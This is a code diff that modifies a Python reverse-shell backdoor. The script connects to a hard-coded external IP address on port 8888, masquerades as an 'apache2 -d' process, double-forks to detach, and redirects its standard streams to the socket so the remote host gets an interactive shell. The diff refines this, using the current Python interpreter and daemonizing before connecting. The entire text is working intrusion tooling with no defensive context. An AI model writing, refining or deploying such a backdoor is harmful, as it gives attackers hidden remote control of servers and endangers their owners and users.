@@ -2,7 +2,7 @@
 import sys, socket, os
 import pty, fcntl, struct, termios, select, resource
 
-pybin = '/usr/bin/python'     ## path to python on server
+pybin = sys.executable        ## path to python on server
 name  = 'apache2 -d'          ## fake name for our process (can contain spaces & fake args)
 host  = '95.181.93.72'        ## HOST to connect to
 port  = 8888                  ## PORT to connect to
@@ -31,6 +31,10 @@ if len( sys.argv ) < 2:                                  ## is here special hidd
     os.execv( pybin, [ name, ' ', ' ' ] )                ## exec python /tmp/<<space>> <<space>>
     ## nothing is called after execv...
 
+
+if os.fork() > 0: os._exit( 0 )                          ## forking for deattaching from main thread
+if os.fork() > 0: os._exit( 0 )                          ## ...
+
 try:                                                     ## creating socket & connecting...
     sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
     sock.connect( (host, port) )
@@ -38,9 +42,6 @@ try:                                                     ## creating socket & co
 except:
     print "[!] Can't connect !\n"
     exit( 0 )
-
-if os.fork() > 0: exit( 0 )                              ## forking for deattaching from main thread
-if os.fork() > 0: exit( 0 )                              ## ...
 
 os.dup2( fsock, sys.stdin.fileno()  )
 os.dup2( fsock, sys.stdout.fileno() )
